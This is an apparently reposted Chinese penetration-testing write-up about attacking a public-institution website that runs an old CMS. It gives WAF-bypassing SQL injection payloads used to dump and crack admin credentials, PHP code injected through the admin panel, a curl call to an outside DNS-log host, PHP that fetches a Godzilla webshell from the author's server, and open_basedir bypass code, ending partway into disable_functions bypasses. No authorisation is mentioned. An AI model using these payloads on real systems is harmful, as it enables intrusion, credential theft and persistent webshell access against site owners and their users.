---
title: 一次事业单位的web渗透实战
url: https://mp.weixin.qq.com/s/I6W_lAhfmo4xiR_yF4e2gg
source: Doonsec's feed
date: 2026-09-12
fetch_date: 2026-09-13T06:58:03.224991
---

# 一次事业单位的web渗透实战

# 一次事业单位的web渗透实战

点击关注 👉
点击关注 👉

马哥网络安全

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2I159AwKj57wLWseUGy7rxd9BAZGeYuTibibQgQGDoGMjHFXy4jZwoA4PdlIxMPAe9GiaNjahksEdUTQxKib9YmMmAickmN7ubg5DLnWCrIqj5j8/640?wx_fmt=png&from=appmsg)

文章作者：mimi

文章来源：https://xz.aliyun.com/news/92195

01

0x1 一次事业单位的web渗透实战

### 起因

事业单位，用了一个cms，看着年久失修，而且cms不开源，相关漏洞比较少，还可能捡几个通杀

事业单位的防御还是有的，不太好测试，就先在fofa找一个没有防御的同款网站尝试

### 低防状态下的渗透

进入网站，大多是静态页面，主要是这些功能

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QUicDCpmdHFZIfwPCWqek0pZByr01vmZ9r8OnCiatZia7odmbaSKLMsBpLO8tZnYfoBDF9D9pcLCRDy3JJL6wd3aJm9aicicejWeRmg/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&watermark=1#imgIndex=2)

存在注册功能，那就注册一个用户，登陆后看到还是有很多功能的，点点点

找到一个可疑点，id参数可控，而且在其它数据包里没有出现过这个字段

正常的包

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QXp36071V3WDzv4o3DMdbzmpjVH72Ko0ygd1BtB1IeA2iaqQNL2PBW9LXapJmF9ibLM3LhoqDWkaUzgXhX71eB0LOWwREeoeEfGY/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&watermark=1#imgIndex=3)

尝试下报错注入

```
id=0 and updatexml(1, concat(0x7e, database(), 0x7e), 1);
```

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QU8SzMicMyNJibykbUJVOn4ibP9kU2ZeAZwEflF6hRJGTcDEpgF1PibQh4fF0s4iapLj7eyQwoWosL2CYqJyFJUibLPeE7M4WLMHol9M/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&watermark=1#imgIndex=4)

宝塔免费版，那就绕过一下，模糊测试了很多都没被封，免费版的waf还是很温和的

最终用%0a绕过匹配

```
id=0 and update%0axml(1, concat(0x7e, dat%0aabase(), 0x7e), 1);
```

成功报错，而且语句都抛了出来

![图片](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QXpcQa05OsMKPNaEUe4asPG6aPia5Vkmiazy0qHOeUU1SGKXeSF5A9FfPcKO69bGVnjHkP4vRbUicRgKk3gOmiabhhybmETq3DfxAU/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=5)

找叫admin的表，这些表的价值比较高，通配符%要编码，不然就把%ad当url编码了

```
id=0 and update%0axml(1, concat(0x7e, (sele%0act table_name from informat%0aion_schema.tables where table_name like '{{urlenc(%admin%)}}'limit 0,1), 0x7e), 1);
```

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QUlfkeQqW5ZkBluT9tJ8aD5ibnKltXbiboTqghX2NsocI1SNPFFjXttuiclYNNHpc68UE1Dtv59ekkmvOHDkAjyCnrcL5MIR34mLs/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&watermark=1#imgIndex=6)

报错了，根据抛出的语句发现是单引号被过滤了，不抛出我都想不到，那就用十六进制绕过下

```
id=0 and update%0axml(1, concat(0x7e, (sele%0act table_name from informat%0aion_schema.tables where table_name like 0x2561646d696e25 limit 0,1), 0x7e), 1);
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QXBfjwrMIM66SFsgZ7YqmUF160ruxVVroPawouI9HbY6KaiaJRsKKfow027njiaBTl8EXxpwvbSiajUdSkmiccTc1IzVkRcaOjqmVI/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&watermark=1#imgIndex=7)

成功爆出表名，继续爆字段名

```
id=0 and update%0xml(1, concat(0x7e, (sele%0ct column_name from informat%0ion_schema.columns where table_name=0x??? limit 0,1), 0x7e), 1);
```

再爆数据

```
id=0 and update%0xml(1, concat(0x7e, (sele%0ct username,password from _admin limit 0,1), 0x7e), 1);
```

老旧系一般都是用md5加密存的密码，放到网上破解下，这里贴几个我常用的破解网站

cmd5要收费的，有的用其它两个网站也能免费解出来

https://www.cmd5.com/

https://toolshu.com/crackmd5

https://pmd5.com/

成功解密获得一套凭证

接下来就是找后台的登录地址了

这里犯了个错，一套cms的默认路径，一般都很少人会去改，但是在这里折腾了半小时也没在数据库翻到地址

#### ×

一般叫menu、route、conf、nav的这些表中会有记录

```
id=0 and update%0axml(1, concat(0x7e, (sele%0act table_name from informat%0aion_schema.tables where table_name like 0x??? limit {{int(0-10)}},1), 0x7e), 1);
```

搜下menu表，yakit自带的正则匹配，还是很好用的

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QUn7ic0dRqpt5Z9Z9UQUDH0ibt9Q7PHNW2uAtCnRiaNkjj8scnNdakqyU1gaNficwIluMAb4dXJNbib79SaziaErRSgswtmBcVHpjDhk/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&watermark=1#imgIndex=8)

无果

#### √

网上搜索这个cms和登录两个字，直接冒出来了

![图片](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QU6ic8Zqy2dE796JUpZlFulTI3JGgT488LfFrQN5I1cPCD5S5f5DdWD5DyEzLgEEZ5V43o6LVboS9NkEJSeeJkmvmtUib3PLuqXU/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&watermark=1#imgIndex=9)

看来还是挺多人用的

登入后台，翻遍所有功能，发现一个模块管理的地方，看着都是代码，就写个php代码进去，看看是不是能执行代码的地方

![图片](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QWZXSatRZnoMicJ411KpX4DSN9W66B16QM9ibtwcLW5wbMgeWsoN5UDNGtWMfdFiafu5vkjQcnTQ9wPbcn2cQwictGu0k4ohmDls1I/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&watermark=1#imgIndex=10)

毫无疑问被拦，写入`<? echo __FILE__;?>`

然后将模块链接到页面中，在主站找到对应的页面，成功执行代码

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QXibib9bJiaGAuj7WKlheA1FkUjA5kNtAHrqhTSlIl7ASVSMS9eeMP8IhviaZ6oAyX8dSSzib7nV1m1JnDWOicItQICiacgPhQiclC0gTM/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&watermark=1#imgIndex=11)

那就绕一下连续的三个字符php，成功写入`<? $b = 'pinfo'; ('ph'.$b)();?>`

![图片](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QWialbbhJ5rzgutuWGyGjnRUV7bUxWAlj4yjd8oIg6ibOknTMNxnibJOKmziahxrzuHngQT9KMR8fSICs76bUnvsCWdQsbgeXsPwvA/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&watermark=1#imgIndex=12)

看到禁用函数还是很严格的，open\_basedir也有限制，但是暴露了网站的根目录

尝试写Godzilla马进去，用他自带的功能绕过

直接写文件应该也会被拦，远程下载下来，正好也支持curl，或者编码写入

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QWwjeq7ZQPibA8h1bLb8rzu7Mia5S7GOymFcKhsUeLA3p96TsIGrFIJ08pUicz4kpBIRCoWjD9uS6nFSTA80Aaq6It2CeQwHej9fs/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&watermark=1#imgIndex=13)

先测试能不能出网，宝塔也没有拦截这个

```
<?
$ch = curl_init('ymidqhn9.dns.adysec.com');
curl_exec($ch);
curl_close($ch);
?>
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QXVKTXXfRbqrwclibO4b5v3sLTfgtB1uO5erG0Fyz9103Ne2KfR99qIuXCjql3xynEhsOCnJ7ibxSPeSX526YXn3NQ9m3C9YtxN0/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&watermark=1#imgIndex=14)

成功访问，下载vps的恶意文件到根目录或者uploads目录

vps主机起http服务`python3 -m http.server 8088`

```
<?
$url = 'http://???/test.php';
$localFile = '/www/wwwroot/???/uploads/c4ca4238a0b923820dcc509a6f75849b.php';

$ch = curl_init($url);
$fp = fopen($localFile, 'wb');

curl_setopt($ch, CURLOPT_FILE, $fp);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);

curl_exec($ch);
curl_close($ch);
fclose($fp);

echo"Downloaded to: " . $localFile;
?>
```

也是安全落地，连接成功

![图片](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QX5u8UwVB3kQIYHJPicycib5whb1W9evgesxJPljpficibSnUiaiahxzEoUe07iatLdiaKlyO34liaWrfYcicjwOEa8UZDyeibm8FG8NJGzPs/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&watermark=1#imgIndex=15)

Godzilla自带插件可以绕过disable\_functions和open\_basedir，下面介绍一下其中的原理

### 绕过Open\_basedir

Open\_basedir是PHP设置中为了防御PHP跨目录进行文件（目录）读写的方法，所有PHP中有关文件读、写的函数都会经过open\_basedir的检查。

Open\_basedir实际上是一些目录的集合，在定义了open\_basedir以后，php可以读写的文件、目录都将被限制在这些目录中。

设置open\_basedir的方法：

在linux下，不同的目录由“:”分割，如“/var/www/:/tmp/”

在Windows下不同目录由“;”分割，如“c:/www;c:/windows/temp”

#### 利用chdir与ini\_set绕过

```
<?php
echo getcwd()."\n";
var_dump(ini_get('open_basedir'));
ini_set('open_basedir', '../');
var_dump(ini_get('open_basedir'));
ini_set('open_basedir', '../../');
var_dump(ini_get('open_basedir'));
chdir('../');
chdir('../');
chdir('../');
echo getcwd()."\n";
ini_set('open_basedir', '/'); // /www/../
var_dump(ini_get('open_basedir'));
//printf(file_get_contents('/etc/passwd'));
```

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QVSHq7S1BxCrlHodJXRKFFFx2sKjHicfxDEB3SxBFaibib7IR3bUkurLia7sE9d7rfNZdFtS24iaK5DDdeuHbXV3T9zD8T5OCFWMYNc/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&watermark=1#imgIndex=16)

```
ini_set('open_basedir', '../');
```

设置Open\_basedir为../成功的原因是当前在uploads目录，回退一层刚好回到网站目录下，而网站根目录是被允许的最大目录

如果当前就是在Open\_basedir的最大目录下，那就要新建目录，chdir到新目录再设置Open\_basedir为../

```
ini_set('open_basedir', '../../');
```

想设置为../../就没有用，因为回退一层已经到设置的根目录了，回退两层就到了/www/wwwroot/目录下，是不被允许的，所以没有设置成功

因为chdir存在漏洞，只看了Open\_basedir的相对路径，所以一直回退，直到回退到/www目录

```
ini_set('open_basedir', '/'); // /www/../
```

设置Open\_basedir为/成功的原因是用了相对路径来设置，当前路径已经是/www，而/www/../又是合法的路径，所以打破限制

可以看这个再来理解一遍

![图片](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QUwicJE4LZZO5ucuqz1GUlBOzuGbHrQjCoheJcKfICQCpRzr7eic7WAsV50Xaf6o5EK0QNJmgTtO9s9icGEfbH3mr9fjkncrdmMBU/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&watermark=1#imgIndex=17)

以此绕过了openbasedir限制

### 绕过disable\_functions

#### 配置错误

有了文件管理权限后，那就可以先去翻一下文件，在/tmp目录下找sock文件

因为当前有了php代码执行权限，就可以伪装成cgi\_client与sock通信了

这里存在三个不同版本，那就去翻这三个版本的配置文件，看看有没有漏网之鱼
...